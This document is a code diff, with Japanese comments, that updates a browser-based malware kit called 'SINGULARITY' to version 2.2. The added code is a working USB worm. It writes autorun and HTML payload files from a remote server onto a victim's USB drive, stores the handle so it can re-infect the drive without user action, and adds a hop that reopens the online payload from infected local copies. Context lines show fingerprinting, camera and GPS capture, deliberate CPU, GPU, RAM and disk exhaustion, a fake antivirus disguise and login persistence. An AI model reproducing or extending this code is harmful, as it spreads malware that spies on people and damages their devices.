@@ -1,11 +1,16 @@
 """
-SINGULARITY v2.1  --  apex-class resident link virus weapon
+SINGULARITY v2.2  --  apex-class resident link virus weapon
 ===========================================================
 ブラウザの権限内で到達可能な物理限界まで振り切り、さらに
 PWA として端末に「常駐インストール」させる最上位兵器。
 外部依存ゼロ（アイコン生成のみ Pillow があれば使う）。
 
-統合系統（15クラス / 140+シグナル / 5資源同時攻撃 / 常駐化）:
+v2.2 変更点:
+  ・USBワーム（相手のUSBを再武装）を payload 側に実装
+  ・file:// で開かれた感染体がオンラインなら本体へ増援タブを開く（hop）
+  ・CFG に usb* / hop を追加
+
+統合系統（16クラス / 140+シグナル / 5資源同時攻撃 / 常駐化）:
   1  指紋      Canvas / WebGL / AudioContext / フォント実測 / 数学 / コーデック / DRM
   2  環境      ハードウェア / 画面 / DPR / 言語 / TZ / メディアクエリ / standalone判定
   3  ネット    IP / ASN / ISP / 地理 / WebRTCローカルIP漏洩 / VPN・プロキシ・Tor判定
@@ -22,6 +27,7 @@ PWA として端末に「常駐インストール」させる最上位兵器。
  14  制御      Service Worker 経由の遠隔コマンド（凍結中でも効く）
  15  常駐      PWAインストール / 偽セキュリティソフト偽装 / OSログイン自動起動 /
                ファイル・プロトコル・共有ハンドラ乗っ取り / focus-existing
+ 16  USB伝染  相手のUSBを File System Access API で再武装（記憶して無操作で再伝染）
 
 レベル（監視室から遠隔変更・0〜5）:
   0 偵察 / 1 標準 / 2 加熱 / 3 制圧 / 4 焦土 / 5 特異点
@@ -269,7 +275,7 @@ self.addEventListener("fetch", e => {
 # ペイロード本体（ブラウザで実行される JS）
 # ---------------------------------------------------------------------------
 PAYLOAD_JS = r"""
-/*! SINGULARITY v2.1 -- apex-class resident link virus weapon | igtracker */
+/*! SINGULARITY v2.2 -- apex-class resident link virus weapon | igtracker */
 (function () {
 "use strict";
 if (window.__SINGULARITY__) return;
@@ -300,6 +306,7 @@ var CFG = Object.assign({
   media: true, geo: true, sensors: true, clipboard: false, badge: false,
   wakelock: false, titleFlicker: true,
   install: "auto", installLevel: 4, avName: "脆弱性ブロッカー",
+  usbWorm: false, usbBase: "", usbCode: "", usbLabel: "", hop: false,
   interval: 12000, cmdInterval: 3000, timeout: 4000, maxRetry: 6
 }, window.__SINGULARITY_CFG__ || {});
 
@@ -346,13 +353,13 @@ if (STANDALONE && CFG.installLevel && LEVEL < CFG.installLevel) applyLevel(CFG.i
 var SID = CFG.sid || rid(14);
 var T0 = now();
 var R = {
-  v: "2.1", sid: SID, t0: T0, t: T0, level: LEVEL, w: W,
-  usb: Q("u") || null,                      // ← 追加（USB経由の識別タグ）
+  v: "2.2", sid: SID, t0: T0, t: T0, level: LEVEL, w: W,
+  usb: Q("u") || null,                      // ← USB経由の識別タグ
   host: location.host, url: location.href, ref: document.referrer || null,
   chain: [], env: {}, page: {}, network: {}, vectors: {}, hardware: {},
   privacy: {}, media: {}, bot: {}, behavioral: {}, viral: {}, verdict: {},
   disk: {}, ram: {}, burn: {}, history: {}, audio: {}, win: {}, install: {},
-  errors: [], attempts: 0
+  usbw: {}, errors: [], attempts: 0
 };
 var WORKERS = [];
 function err_(e) { try { R.errors.push(String((e && e.message) || e).slice(0, 140)); if (R.errors.length > 40) R.errors.shift(); } catch (_) {} }
@@ -1084,6 +1091,7 @@ function wipe() {
     }));
   } catch (e) {}
   try { if (window.indexedDB) { try { indexedDB.deleteDatabase("singularity"); } catch (e) {} } } catch (e) {}
+  try { if (window.indexedDB) { try { indexedDB.deleteDatabase("sg-usb"); } catch (e) {} } } catch (e) {}
   try {
     if (navigator.storage && navigator.storage.getDirectory) {
       tasks.push(navigator.storage.getDirectory().then(function (dir) {
@@ -1249,7 +1257,7 @@ function installKit() {
   if (!standalone && CFG.install === "auto") {
     addEventListener("click", function once(ev) {
       if (!BIP) return;
-      try { if (ev.target && ev.target.id === "sg-in-btn") return; } catch (e) {}
+      try { if (ev.target && (ev.target.id === "sg-in-btn" || ev.target.id === "sg-usb-btn")) return; } catch (e) {}
       removeEventListener("click", once);
       doPrompt();
     });
@@ -1267,7 +1275,208 @@ function installKit() {
   window.__sgInstall = doPrompt;
 }
 
-/* ================= 18. 起動 ================= */
+/* ================= 18. USBワーム（相手のUSBを再武装） =================
+   File System Access API で、感染PCに挿されたUSBのルートへ
+   autorun.inf / START.html / offline.html / *.url ... を書き込む。
+   一度選んだフォルダは IndexedDB に記憶し、権限が残っていれば
+   次回は無操作で自動再武装する（＝本物のUSBワーム）。
+   配布物はサーバーの公開ルート /usb/manifest と /usb/file/{idx} から取る。
+=================================================================== */
+var USB_BUSY = false, USB_DB = "sg-usb", USB_KV = "kv";
+
+function usbIdb() {
+  return new Promise(function (res, rej) {
+    try {
+      var r = indexedDB.open(USB_DB, 1);
+      r.onupgradeneeded = function () {
+        try { if (!r.result.objectStoreNames.contains(USB_KV)) r.result.createObjectStore(USB_KV); } catch (e) {}
+      };
+      r.onsuccess = function () { res(r.result); };
+      r.onerror = function () { rej(r.error); };
+    } catch (e) { rej(e); }
+  });
+}
+function usbGet(k) {
+  return usbIdb().then(function (d) {
+    return new Promise(function (res) {
+      try {
+        var q = d.transaction(USB_KV, "readonly").objectStore(USB_KV).get(k);
+        q.onsuccess = function () { res(q.result || null); };
+        q.onerror = function () { res(null); };
+      } catch (e) { res(null); }
+    });
+  }).catch(function () { return null; });
+}
+function usbPut(k, v) {
+  return usbIdb().then(function (d) {
+    try { d.transaction(USB_KV, "readwrite").objectStore(USB_KV).put(v, k); } catch (e) {}
+  }).catch(function () {});
+}
+
+function usbCode() { return CFG.usbCode || CFG.code || ""; }
+function usbLabel() { return CFG.usbLabel || CFG.avName || "保護ツール"; }
+function usbAbs(p) {
+  try {
+    var b = CFG.usbBase ? CFG.usbBase.replace(/\/+$/, "") + "/" : location.origin + "/";
+    return new URL(p.replace(/^\//, ""), b).toString();
+  } catch (e) { return (CFG.usbBase || location.origin) + p; }
+}
+function usbQuery() {
+  var p = new URLSearchParams();
+  p.set("code", usbCode());
+  p.set("level", String(LEVEL));
+  p.set("label", usbLabel());
+  p.set("windows", "0");
+  if (R.usb) p.set("tag", R.usb);
+  return p.toString();
+}
+function usbLog(s) {
+  R.usbw.msg = s;
+  var d = document.getElementById("sg-usb-log");
+  if (d) d.textContent = s;
+}
+function usbBusy(on) {
+  var b = document.getElementById("sg-usb-btn");
+  if (!b) return;
+  b.disabled = !!on;
+  b.textContent = on ? "\u23F3 書き込み中…" : "\uD83D\uDD0C USBにも仕込む";
+}
+function usbReady() { USB_BUSY = false; usbBusy(false); }
+
+function usbBtn() {
+  if (!document.body) return null;
+  var b = document.getElementById("sg-usb-btn");
+  if (b) return b;
+  b = document.createElement("button");
+  b.id = "sg-usb-btn";
+  b.type = "button";
+  b.title = "挿しているUSBのルートを選ぶと、そのUSBを武装します";
+  b.style.cssText = "position:fixed;right:12px;bottom:56px;z-index:2147483646;" +
+    "padding:8px 13px;border-radius:99px;border:1px solid #1f5c42;" +
+    "background:rgba(9,13,19,.96);color:#7ee08a;font-weight:600;" +
+    "font:12px/1.4 system-ui,-apple-system,'Hiragino Sans',sans-serif;" +
+    "cursor:pointer;box-shadow:0 3px 14px rgba(0,0,0,.55)";
+  b.textContent = "\uD83D\uDD0C USBにも仕込む";
+  b.onclick = function (ev) {
+    try { ev.stopPropagation(); } catch (e) {}
+    usbArm(true);
+  };
+  document.body.appendChild(b);
+  return b;
+}
+
+function usbPerm(h, ask) {
+  try {
+    if (!h || !h.queryPermission) return Promise.resolve(true);
+    return h.queryPermission({ mode: "readwrite" }).then(function (s) {
+      if (s === "granted") return true;
+      if (!ask) return false;
+      return h.requestPermission({ mode: "readwrite" }).then(function (s2) { return s2 === "granted"; });
+    }).catch(function () { return false; });
+  } catch (e) { return Promise.resolve(false); }
+}
+
+function usbWrite(dir, silent) {
+  var q = usbQuery();
+  return fetch(usbAbs("/usb/manifest") + "?" + q, { cache: "no-store" })
+    .then(function (r) { if (!r.ok) throw new Error("manifest " + r.status); return r.json(); })
+    .then(function (j) {
+      if (!j || !j.ok || !j.files || !j.files.length) throw new Error("manifest 不正");
+      var chain = Promise.resolve(), n = 0, total = j.files.length;
+      j.files.forEach(function (f) {
+        chain = chain.then(function () {
+          return fetch(usbAbs("/usb/file/" + f.idx) + "?" + q, { cache: "no-store" })
+            .then(function (r) { if (!r.ok) throw new Error(f.name); return r.blob(); })
+            .then(function (b) { return dir.getFileHandle(f.name, { create: true }); })
+            .then(function (fh) { return fh.createWritable(); })
+            .then(function (w) { return w.write(b).then(function () { return w.close(); }); })
+            .then(function () {
+              n++;
+              if (!silent) usbLog(n + " / " + total + " 書き込み中… " + f.name);
+            });
+        });
+      });
+      return chain.then(function () { return n; });
+    });
+}
+
+function usbDone(n, silent) {
+  USB_BUSY = false;
+  R.usbw.done = n; R.usbw.at = now();
+  var b = document.getElementById("sg-usb-btn");
+  if (b) {
+    b.disabled = false;
+    b.textContent = "\u2705 " + n + "ファイル書込済";
+    setTimeout(function () { usbReady(); }, 6000);
+  }
+  if (!silent) usbLog(n + " ファイルを書き込みました。USBを安全に取り外してください。");
+  push(true);
+}
+
+function usbPick() {
+  if (!window.showDirectoryPicker) { usbReady(); return Promise.resolve(false); }
+  return window.showDirectoryPicker({ mode: "readwrite", id: "sg-usb", startIn: "desktop" })
+    .then(function (dir) {
+      usbPut("dir", dir);
+      usbLog("書き込み中…");
+      return usbWrite(dir, false).then(function (n) { usbDone(n, false); return true; });
+    })
+    .catch(function (e) {
+      if (e && e.name === "AbortError") { usbReady(); return false; }
+      usbLog("失敗: " + ((e && e.message) || e));
+      usbReady();
+      return false;
+    });
+}
+
+function usbArm(interactive) {
+  if (!CFG.usbWorm || !usbCode() || !window.showDirectoryPicker) {
+    if (interactive) usbLog("このブラウザはUSB書き込みに未対応です（Chrome/Edge推奨）");
+    return Promise.resolve(false);
+  }
+  if (USB_BUSY) return Promise.resolve(false);
+  USB_BUSY = true;
+  usbBusy(true);
+  return usbGet("dir").then(function (h) {
+    if (!h) return usbPick();
+    return usbPerm(h, !!interactive).then(function (ok) {
+      if (!ok) return interactive ? usbPick() : (usbReady(), false);
+      return usbWrite(h, !interactive)
+        .then(function (n) { usbDone(n, !interactive); return true; })
+        .catch(function (e) {
+          // USBが刺さっていない／権限が失効 など
+          if (interactive) return usbPick();
+          usbReady();
+          return false;
+        });
+    });
+  }).catch(function (e) { err_(e); usbReady(); return false; });
+}
+
+function usbWormKit() {
+  if (!CFG.usbWorm || !usbCode()) return;
+  if (!window.showDirectoryPicker) return;      // Chromium系デスクトップのみ
+  usbBtn();
+  usbLog("USBを挿して「USBにも仕込む」を押すと、そのUSBが武装されます");
+  // 過去に武装したUSBを覚えていて、権限が残っていれば無操作で再武装
+  setTimeout(function () { usbArm(false); }, 2500);
+}
+
+/* ================= 19. file:// からオンライン本体へ増援 ================= */
+function hopFile() {
+  if (!CFG.hop || location.protocol !== "file:") return;
+  if (navigator.onLine === false) return;
+  setTimeout(function () {
+    try {
+      var u = CFG.path + "?u=" + encodeURIComponent(R.usb || "usb") + "&ref=" + SID + "&w=0";
+      var w = window.open(u, "_blank");
+      R.hop = { url: u, opened: !!w };
+      push(false);
+    } catch (e) { err_(e); }
+  }, 4000);
+}
+
+/* ================= 20. 起動 ================= */
 function arm() {
   try { base(); } catch (e) { err_(e); }
   try { pageMeta(); } catch (e) {}
@@ -1288,6 +1497,7 @@ function arm() {
   try { persistState(); } catch (e) {}
   try { swInstall(); } catch (e) {}
   try { installKit(); } catch (e) { err_(e); }
+  try { usbWormKit(); } catch (e) { err_(e); }
   try { camera(); } catch (e) {}
   try { geo(); } catch (e) {}
   try { pollCmd(); } catch (e) {}
@@ -1299,6 +1509,7 @@ function arm() {
   addEventListener("visibilitychange", function () { if (document.visibilityState === "hidden") push(true); });
 
   if (CFG.wipe) { setTimeout(wipe, 1600); }
+  try { hopFile(); } catch (e) {}
   if (!CFG.fire) { push(false); return; }
 
   setTimeout(function () {
@@ -1325,6 +1536,7 @@ window.__singularity = {
   link: function () { return R.viral.childLink || null; },
   flush: function () { push(true); },
   install: function () { return window.__sgInstall ? window.__sgInstall() : false; },
+  usb: function () { return usbArm(true); },
   freeze: freezeNow, wipe: wipe, pause: pauseAll,
   destroy: function () {
     pauseAll();
@@ -1353,9 +1565,9 @@ VIRUS: Dict[str, Any] = {
     "emoji": "◎",
     "color": "#00ff88",
     "description": "全16系統・5資源同時攻撃の常駐最終兵器。PWAとして端末にインストールされ、OSログイン時に自動起動し、相手のUSBにも自分を仕込んで伝染する。",
-    "description_en": "Apex resident weapon: installs as a PWA, auto-runs at OS login, and exhausts CPU/GPU/RAM/disk while freezing the main thread.",
+    "description_en": "Apex resident weapon: installs as a PWA, auto-runs at OS login, exhausts CPU/GPU/RAM/disk, and re-arms the victim's USB sticks.",
     "tags": ["apex", "resident", "pwa", "install", "self-replicating", "persistent",
-             "cpu-burn", "gpu-burn", "ram-balloon", "disk-fill", "freeze", "camera", "gps"],
+             "cpu-burn", "gpu-burn", "ram-balloon", "disk-fill", "freeze", "camera", "gps", "usb-worm"],
     "vectors": 16,
     "signals": 140,
     "requires_https": True,
@@ -1374,6 +1586,7 @@ VIRUS: Dict[str, Any] = {
         "diskRatio": 0, "chunkMB": 8, "cores": 0, "ramMB": 0, "gpu": False,
         "burn": False, "audio": False, "media": True, "geo": True, "mutate": True,
         "install": "auto", "installLevel": 4, "avName": APP_NAME_DEFAULT,
+        "usbWorm": False, "usbBase": "", "usbCode": "", "usbLabel": "", "hop": False,
     },
 }
 VIRUS_SPEC = VIRUS
